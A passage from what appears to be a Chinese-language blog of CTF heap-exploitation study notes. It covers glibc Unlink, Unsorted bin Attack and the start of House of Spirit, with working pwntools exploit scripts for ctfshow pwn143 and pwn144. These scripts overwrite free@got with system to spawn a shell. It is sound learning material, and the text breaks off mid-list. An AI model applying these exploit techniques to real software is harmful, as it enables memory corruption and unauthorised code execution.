class="hljs-title function_">Del</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>    sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br>Add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>Add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;bbbbbbbb&#x27;</span>)<br><br>Edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-string">&#x27;\x41&#x27;</span>)<br>Del(<span class="hljs-number">1</span>)<br><br>Add(<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x30</span>) + p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>show(<span class="hljs-number">1</span>)<br><br>ru(<span class="hljs-string">&#x27;Content : &#x27;</span>)<br>freeAddr = u(r(<span class="hljs-number">6</span>).strip().ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>,freeAddr)<br>libc.select_libc(<span class="hljs-number">4</span>)<br>libcBase = freeAddr - libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br>Addr = SLSysBin(libc,libcBase)<br><br>Edit(<span class="hljs-number">1</span>,p(Addr[<span class="hljs-number">0</span>]))<br><br>Del(<span class="hljs-number">0</span>)<br><br>inter()<br><span class="hljs-comment"># libc6_2.27-3ubuntu1.6_amd64</span><br></code></pre></td></tr></table></figure><h5 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h5><p><img src="/../Images/1743083941610-5e1ed8b7-54ca-47e5-9711-e7825df2afc1.png"></p><p><img src="/../Images/1743083954156-27fc59c5-104d-4e88-9b39-e3bf0bf6f9d4.png"></p><p><img src="/../Images/1743083967763-e35d4ff1-4f7a-4352-a75e-b028868375b4.png"></p><p><img src="/../Images/1743083977400-a0669fcc-c54a-4be1-9f16-076ec3720d74.png"></p><h5 id="堆变化"><a href="#堆变化" class="headerlink" title="堆变化"></a>堆变化</h5><p><img src="/../Images/1743084062964-64fae296-a4b0-4bf2-9015-261ac8dcc4e1.png"></p><h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><h2 id="Fake-thunk模板"><a href="#Fake-thunk模板" class="headerlink" title="Fake_thunk模板"></a>Fake_thunk模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#AMD64下实现fake_thunk</span><br>add(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br>thunk_ptr = <span class="hljs-number">0x006020C0</span><br>fakefd = thunk_ptr - <span class="hljs-number">0x18</span><br>fakebk = thunk_ptr - <span class="hljs-number">0x10</span><br><br>fake_thunk = p(<span class="hljs-number">0</span>)<br>fake_thunk += p(<span class="hljs-number">0x41</span>)<br>fake_thunk += p(fakefd)<br>fake_thunk += p(fakebk)<br>fake_thunk += junk(<span class="hljs-number">0x20</span>)<br><br>fake_thunk += p(<span class="hljs-number">0x40</span>)<br>fake_thunk += p(<span class="hljs-number">0x90</span>)<br></code></pre></td></tr></table></figure><p>thunk结构</p><p><img src="/../Images/1743064752606-86f7b81c-44ab-460e-91c8-209d2df5e3f2-1750152657150-29.png"></p><p>Unlink： 将一个空闲的 chunk 从双向链表中移除，更新BK、FD的bk、fd（BK、FD都是一个thunk）</p><p>简单来说将一个thunk从一个双向链表中删除，但是保证这个双向链表不被破坏</p><ul><li>fd：指向下一个空闲的 chunk</li><li>bk：指向上一个空闲的 chunk</li></ul><p>个人理解：<br>Unlink有点像连带责任，P走了，那么BK、FD就要必须更新新的信息</p><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><h3 id="1-原先的双向链表"><a href="#1-原先的双向链表" class="headerlink" title="1. 原先的双向链表"></a>1. 原先的双向链表</h3><p><img src="/../Images/1750085222497-cb92602d-7946-4eae-a5dc-d439b1038389.png"></p><h3 id="2-Unlink后的双向链表（Unlink-P-）"><a href="#2-Unlink后的双向链表（Unlink-P-）" class="headerlink" title="2. Unlink后的双向链表（Unlink(P)）"></a>2. Unlink后的双向链表（Unlink(P)）</h3><p>也就说<code>Unlink(P)</code></p><ul><li>BK-&gt;fd &#x3D; P-&gt;fd &#x3D; FD</li><li>FD-&gt;bk &#x3D; P-&gt;bk &#x3D; BK</li></ul><blockquote><p>那也就说<br>当我们设置了<code>P-&gt;bk</code>的值，那么<code>FD-&gt;bk</code>也会被我们设置<br>当我们设置了<code>P-&gt;fd</code>的值，那么<code>BK-&gt;fd</code>也会被我们设置<br>而FD、BK又是由P-&gt;fd、P-&gt;bk来决定的<br>这就实现了任意内存写</p></blockquote><p><img src="/../Images/1750085484389-7a32c416-88fc-4352-9ec5-b4564b8d5d09.png"></p><h4 id="a-fd-bk"><a href="#a-fd-bk" class="headerlink" title="a. fd !&#x3D; bk"></a>a. fd !&#x3D; bk</h4><blockquote><p>P-&gt;fd &#x3D; 0x1234<br>P-&gt;bk &#x3D; 0x5678<br>那么<br>BK &#x3D; 0x5678<br>FD &#x3D; 0x1234<br><em>((size_t</em>)BK+2) &#x3D; P-&gt;fd &#x3D;&#x3D; 0x1234<br><em>((size_t</em>)FD+3) &#x3D; P-&gt;bk &#x3D;&#x3D; 0x5678<br>能看到，两个不同的地址<code>*((size_t*)BK+2)``*((size_t*)FD+3)</code>，通过Unlink实现了覆写</p></blockquote><p><img src="/../Images/1750126775439-056107b1-7449-4c73-a9e0-1f6c56f595c8.png"></p><h4 id="b-fd-bk"><a href="#b-fd-bk" class="headerlink" title="b. fd &#x3D; bk"></a>b. fd &#x3D; bk</h4><blockquote><p>P-&gt;fd &#x3D; 0x1234<br>P-&gt;bk &#x3D; 0x1234<br>BK &#x3D; 0x1234<br>FD &#x3D; 0x1234<br><em>((size_t</em>)BK+2) &#x3D; P-&gt;fd &#x3D;&#x3D; 0x1234<br><em>((size_t</em>)FD+3) &#x3D; P-&gt;bk &#x3D;&#x3D; 0x1234</p><ul><li>*((size_t*)thunk+2) &#x3D; P-&gt;fd &#x3D;&#x3D; 0x1234*</li><li><em>*((size_t</em>)thunk+3) &#x3D; P-&gt;bk &#x3D;&#x3D; 0x1234<br>依据这个特性，那么我们就可以实现定点写入<br>  <img src="/../Images/1750127332600-8f64c6a0-c234-4d19-887a-cc7b4b53d442.png"></li></ul></blockquote><h4 id="c-定点"><a href="#c-定点" class="headerlink" title="c. 定点"></a>c. 定点</h4><blockquote><p>写入<code>fd</code>的位置<br>P-&gt;fd &#x3D; target-1<br>P-&gt;bk &#x3D; target<br>BK &#x3D; target<br>FD &#x3D; target-1<br><em>((size_t</em>)BK+2) &#x3D; P-&gt;fd<br><em>((size_t</em>)FD+3) &#x3D; P-&gt;bk </p><ul><li>*((size_t*)thunk+3) &#x3D; P-&gt;fd</li><li>*((size_t*)thunk+3) &#x3D; P-&gt;bk</li></ul></blockquote><p><img src="/../Images/1750129191691-9dff88cf-988b-442f-9451-8f8aa722fca5.png"></p><blockquote><p>如果只考虑一个（FD或者BK的话）那么会更简单<br>比如说我只考虑BK<br>那么<br>P-&gt;fd &#x3D; value<br>P-&gt;bk &#x3D; target_addr<br>就是实现了<br><code>*((size_t*)target_addr+2) = value</code><br>反之：<br>P-&gt;fd &#x3D; target_addr<br>P-&gt;bk &#x3D; value<br>就是实现了<br><code>*((size_t*)target_addr+3) = value</code><br>再简化一下<br>只考虑BK<br>P-&gt;fd &#x3D; value<br>P-&gt;bk &#x3D; target_addr - 2</p></blockquote><p><code>*((size_t*)target_addr) = value</code><br>只考虑FD<br>P-&gt;fd &#x3D; target_addr - 3<br>P-&gt;bk &#x3D; value<br><code>*((size_t*)target_addr) = value</code></p><h3 id="3-无check"><a href="#3-无check" class="headerlink" title="3. 无check"></a>3. 无check</h3><p>在早期，是不存在检查的，也就说，直接通过P-&gt;fd、P-&gt;bk的设置，触发Unlink(P)就可以实现任意内存写的操作</p><h3 id="4-check"><a href="#4-check" class="headerlink" title="4. check"></a>4. check</h3><p>现实很残酷，有洞，总要修的，但是洞是修不完的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)<br><span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \<br>      malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);               \<br>// 检查 fd 和 bk 指针(双向链表完整性检查)<br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                      \<br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \<br><br>  // largebin 中 next_size 双向链表完整性检查 <br>              <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)              \<br>                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    \<br>              malloc_printerr (check_action,                                      \<br>                               <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \<br>                               P, AV);<br></code></pre></td></tr></table></figure><p>增加check后，我们来理解下fd、bk的检查</p><ul><li>FD-&gt;bk !&#x3D; P</li><li>BK-&gt;fd !&#x3D; P</li></ul><p>要想绕过check</p><ul><li><p>FD-&gt;bk &#x3D; P</p></li><li><p>BK-&gt;fd &#x3D; P</p></li><li><p>(P-&gt;fd)-&gt;bk &#x3D; P</p></li><li><p>(P-&gt;bk)-&gt;fd &#x3D; P</p></li></ul><p>来看看我们之前的图：绿色代表FD、BK能够通过check的指向，红色代表我们触发Unlink后FD、BK的指向</p><ul><li><p>FD-&gt;bk &#x3D; BK</p></li><li><p>BK-&gt;fd &#x3D; FD</p></li><li><p>(P-&gt;fd)-&gt;bk &#x3D; BK</p></li><li><p>(P-&gt;bk)-&gt;fd &#x3D; FD</p></li></ul><p><img src="/../Images/1750132313955-72309535-f668-41bd-93c1-bcf783db54b3.png"></p><p>这样看，我们就可以通过定点这个知识点（上边）可以轻松解决</p><p>把BK和FD看成一个大的target_thunk，在target_thunk中BK和FD重合，且在<code>target_thunk中存在P的地址</code>就可以实现绕过了，上图理解下</p><p>target_thunk中存在P的地址</p><p><img src="/../Images/1750133117351-095645ec-ca5a-4383-8c6b-758e2a1529ee.png"></p><p>通过P-&gt;bk、P-&gt;fd布局，使得FD-&gt;bk &#x3D; P、BK-&gt;fd &#x3D; P</p><p><img src="/../Images/1750133461998-e1939518-e471-44ae-b1d8-c67734f0c244.png"></p><p>但是一般来说都是只知道P地址的存储地址，那么我们来转换一下</p><p><img src="/../Images/1750133652417-3792d8ab-574d-4ade-98ed-abc6cfb0f26a.png"></p><p>这样的结果是P_ptr被覆盖成了P-&gt;fd &#x3D;&#x3D; P_Addr-3，至于为什么不是P_Addr-2，我也不造了，个人猜测是P-&gt;bk先覆盖了，P-&gt;fd后覆盖</p><h2 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol><li><p>伪造thunk（fake_thunk），</p></li><li><p>修改fake_thunk所在thunk的下一个thunk（这里叫next_thunk）的<code>prev_size</code>、<code>size上的 P flag(通常默认是1)</code>，通过next_thunk的修改来设置fake_thunk的状态是<code>free</code></p></li><li><p>prev_size &#x3D; fake_thunk-&gt;size(不包含P，即P&#x3D;0)</p></li><li><p>size &#x3D; size-1 (如果size的个位上存在1)</p></li></ol><p>next_thunk的size有要求，必须&gt;&#x3D; 90，即malloc(0x80)[amd64下]</p><p>不然回收的时候（free(next_thunk)）会将next_thunk收到fastbin中，导致触发不了Unlink</p><ol><li>free(next_thunk)：触发Unlink(P)</li></ol><p>解释下<br><code>size上的P flag</code>：PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p><p><code>prev_size</code>：若前一个物理相邻的chunk是free chunk，则表示其大小。否则用于存储前一个chunk的数据</p><h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><h3 id="ctfshowpwn143"><a href="#ctfshowpwn143" class="headerlink" title="ctfshowpwn143"></a>ctfshowpwn143</h3><p>add函数，可以看出它的布局</p><p><img src="/../Images/1750083538368-94f978b3-f22a-44da-b808-f044409a05e7.png"></p><p><img src="/../Images/1750083781947-ad488819-d15b-4dbb-ad8d-c4cdce393181.png"></p><p>edit函数存在堆溢出</p><p><img src="/../Images/1750083903679-efef5470-6839-4eb4-aa8b-a8d6b568aa28.png"></p><p>根据原理，我们来构造fake_thunk，并触发Unlink</p><h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python">elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    sla(<span class="hljs-string">&#x27;length:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">&#x27;the name:&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Edit</span>(<span class="hljs-params">index,size,content</span>):<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    sla(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>    sla(<span class="hljs-string">&#x27;length of name:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">&#x27;the new name:&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Del</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>    sla(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Exit</span>():<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))<br><br>chunk_ptr = <span class="hljs-number">0x6020A8</span><br>fakefd = chunk_ptr - <span class="hljs-number">0x18</span><br>fakebk = chunk_ptr - <span class="hljs-number">0x10</span><br><br>fake_thunk = p(<span class="hljs-number">0</span>)<br>fake_thunk += p(<span class="hljs-number">0x41</span>)<br>fake_thunk += p(fakefd)<br>fake_thunk += p(fakebk)<br>fake_thunk += junk(<span class="hljs-number">0x20</span>)<br><br>fake_thunk += p(<span class="hljs-number">0x40</span>)<br>fake_thunk += p(<span class="hljs-number">0x90</span>)<br><br>Add(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>Add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>Add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>Edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(fake_thunk),fake_thunk)<br>Del(<span class="hljs-number">1</span>)<br><br>payload = p(<span class="hljs-number">0</span>) + p(<span class="hljs-number">0</span>) + p(<span class="hljs-number">0x40</span>) + p(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])<br><br>Edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>show()<br>ru(<span class="hljs-string">&#x27; : &#x27;</span>)<br>func_addr = u(r(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lgs(<span class="hljs-built_in">hex</span>(func_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>,func_addr)<br><br>libcBase = func_addr - libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br><br>sysAddr,shellStr = SLSysBin(libc,libcBase)<br><br>payload = p(sysAddr)<br>Edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>Del(<span class="hljs-number">2</span>)<br><br>inter()<br></code></pre></td></tr></table></figure><h4 id="代码解释-1"><a href="#代码解释-1" class="headerlink" title="代码解释"></a>代码解释</h4><p><img src="/../Images/1750134869456-05c2d7b1-e81d-4cd0-9559-f28a57802049.png"></p><p>fakefd-&gt;List[1] - 0x18(3*8)</p><p>fakebk-&gt;List[1] - 0x10(2*8)</p><p><code>AMD64下size_t的大小为8、i386下size_t的大小为4</code></p><h1 id="Unsorted-bin-Attack"><a href="#Unsorted-bin-Attack" class="headerlink" title="Unsorted bin Attack"></a>Unsorted bin Attack</h1><h2 id="Unsortedthunk模板"><a href="#Unsortedthunk模板" class="headerlink" title="Unsortedthunk模板"></a>Unsortedthunk模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">target = <span class="hljs-number">0x06020A0</span><br>fd = <span class="hljs-number">0</span><br>bk = target - <span class="hljs-number">0x10</span><br><br>payload = junk(<span class="hljs-number">0x20</span>)<br>payload += p(<span class="hljs-number">0</span>)<br>payload += p(<span class="hljs-number">0x91</span>)<br>payload += p(fd)<br>payload += p(bk)<br></code></pre></td></tr></table></figure><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><blockquote><p>这个攻击有点像Unlink，但是可能更高效一点（在进行攻击的时候）也有缺点，就是单纯的Unsorted bin Attack下，任意内存写入的数据不可控，简单理解下</p><p>当我们申请的<code>thunk-&gt;size &gt;= 0x90</code>的时候，再<code>free(thunk)</code>，该thunk会进入<code>unsortedbin</code></p><p>unsortedbin是个双向链表管理器，通俗来讲，它有个最高等级的（虚假的这里我用虚线来表示）<code>tmp_thunk</code>来管理双向链表</p></blockquote><p><img src="/../Images/1750237656883-2fbb0e3d-ede5-4cba-8b17-52ed89050c4e.png"></p><blockquote><p>当我要将thunk1从这个双链中脱出</p><ul><li>更新tmp_thunk-&gt;bk</li><li>更新thunk0-&gt;fd</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><blockquote><ul><li>victim实际上就是unsortedbin中链表的最后一个thunk（这里就是thunk1）</li><li>那么bck就是thunk0</li><li>unsorted_chunks (av)就是tmp_thunk</li></ul><p>翻译一下就是</p><p>tmp_thunk-&gt;bk &#x3D; bck &#x3D;&#x3D; victim-&gt;bk</p><p>bck-&gt;fd &#x3D; tmp_thunk</p><ul><li><p>tmp_thunk-&gt;bk &#x3D; victim-&gt;bk</p></li><li><p>victim-&gt;bk-&gt;fd(实际就是bck-&gt;fd：chunk0-&gt;fd) &#x3D; tmp_thunk</p></li><li><p>victim-&gt;bk+2 &#x3D; tmp_thunk</p></li></ul><p>看得难受？没事，上图</p></blockquote><p><img src="/../Images/1750237667883-2b9d8feb-75d1-4bb7-b681-cc4cb3f87e1d.png"></p><blockquote><p>那也就说，当我们控制了victim-&gt;bk值，那么我们就能将<code>tmp_thunk</code>写入任何地址上，<font style="color:#DF2A3F;">但是</font><code>&lt;font style=&quot;color:#DF2A3F;&quot;&gt;tmp_thunk&lt;/font&gt;</code><font style="color:#DF2A3F;">的值我们无法控制</font></p><p>看表达式</p><ul><li>victim-&gt;bk &#x3D; target-2<ul><li>tmp_thunk-&gt;bk &#x3D; target-2</li><li>victim-&gt;bk+2 [target] &#x3D; tmp_thunk</li></ul></li></ul></blockquote><blockquote><p>此外还要注意一点，待free的thunk不能与<code>top thunk</code>物理相邻，不然free后无法进入unsortedbin</p></blockquote><h2 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h2><h3 id="ctfshowpwn144"><a href="#ctfshowpwn144" class="headerlink" title="ctfshowpwn144"></a>ctfshowpwn144</h3><p>edit：存在堆溢出漏洞</p><p><img src="/../Images/1750237888451-e7f75cdc-6ed1-4766-85e3-bed34b78295b.png"></p><h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">def <span class="hljs-title function_">add</span><span class="hljs-params">(size,content)</span>:<br>    <span class="hljs-title function_">sla</span><span class="hljs-params">(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,str(<span class="hljs-number">1</span>))</span><br>    <span class="hljs-title function_">sla</span><span class="hljs-params">(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,str(size))</span><br>    <span class="hljs-title function_">sa</span><span class="hljs-params">(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,content)</span><br><br>def <span class="hljs-title function_">edit</span><span class="hljs-params">(index,size,content)</span>:<br>    <span class="hljs-title function_">sla</span><span class="hljs-params">(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,str(<span class="hljs-number">2</span>))</span><br>    <span class="hljs-title function_">sla</span><span class="hljs-params">(<span class="hljs-string">&#x27;Index :&#x27;</span>,str(index))</span><br>    <span class="hljs-title function_">sla</span><span class="hljs-params">(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,str(size))</span><br>    <span class="hljs-title function_">sa</span><span class="hljs-params">(<span class="hljs-string">&#x27;Content of heap : &#x27;</span>,content)</span><br><br>def <span class="hljs-title function_">delete</span><span class="hljs-params">(index)</span>:<br>    <span class="hljs-title function_">sla</span><span class="hljs-params">(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,str(<span class="hljs-number">3</span>))</span><br>    <span class="hljs-title function_">sla</span><span class="hljs-params">(<span class="hljs-string">&#x27;Index :&#x27;</span>,str(index))</span><br><br><span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-number">0x20</span>,b<span class="hljs-string">&#x27;aaaa&#x27;</span>)</span><br><span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-number">0x80</span>,b<span class="hljs-string">&#x27;aaaa&#x27;</span>)</span><br><span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-number">0x20</span>,b<span class="hljs-string">&#x27;aaaa&#x27;</span>)</span><br><span class="hljs-title function_">delete</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span><br><br>target = <span class="hljs-number">0x06020A0</span><br>fd = <span class="hljs-number">0</span><br>bk = target - <span class="hljs-number">0x10</span><br><br>payload = junk(<span class="hljs-number">0x20</span>)<br>payload += p(<span class="hljs-number">0</span>)<br>payload += p(<span class="hljs-number">0x91</span>)<br>payload += p(fd)<br>payload += p(bk)<br><br>edit(<span class="hljs-number">0</span>,len(payload),payload)<br><br>add(<span class="hljs-number">0x80</span>,b<span class="hljs-number">&#x27;b</span>bbb<span class="hljs-string">&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">sl(str(0x1BF52))</span><br><span class="hljs-string">inter()</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h4 id="代码解释-2"><a href="#代码解释-2" class="headerlink" title="代码解释"></a>代码解释</h4><p><img src="/../Images/5374ddfc-23cf-47ff-b478-d8035ac83f90.png"></p><h1 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h1><blockquote><p>这个操作是通过伪造fastbin的单向链表来实现的<br>可以实现任意内存构造thunk</p></blockquote><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><h3 id="fastbin的管理机制"><a href="#fastbin的管理机制" class="headerlink" title="fastbin的管理机制"></a>fastbin的管理机制</h3><ul><li>当thunk-&gt;size &lt; 0x90，free(thunk)时会被回收到fastbin中<code>[AMD64下]</code></li><li>当fastbin中为空时，free(thunk)，该thunk-&gt;fd &#x3D; 0</li><li>当fastbin中不为空时，free(thunk)，该thunk-&gt;fd指向上一个被回收入fastbin中的thunk</li><li>申请同样大小的thunk时，返回链表的头thunk，该thunk从fastbin中脱链，thunk-&gt;fd被content覆盖</li></ul><blockquote><p>看文字总是有点不够生动，看图吧</p></blockquote><p><img src="/../Images/1750300349682-73e1b510-a516-4d8b-bfe8-57fffb18818e.png" alt="img"></p><p><img src="/../Images/1750300555224-2551328a-3e51-4e9c-b10a-bfcade9aef00.png" alt="img"><img src="/../Images/1750300816408-aebf7a3d-14fb-470e-b7ce-6132cb1893e2.png" alt="img"></p><h3 id="fastbin添加thunk"><a href="#fastbin添加thunk" class="headerlink" title="fastbin添加thunk"></a>fastbin添加thunk</h3><p>这里有两种</p><ol><li>手动free(fake_thunk)，实现fastbin添加fake_thunk，但是在free的时候有要求<ol><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 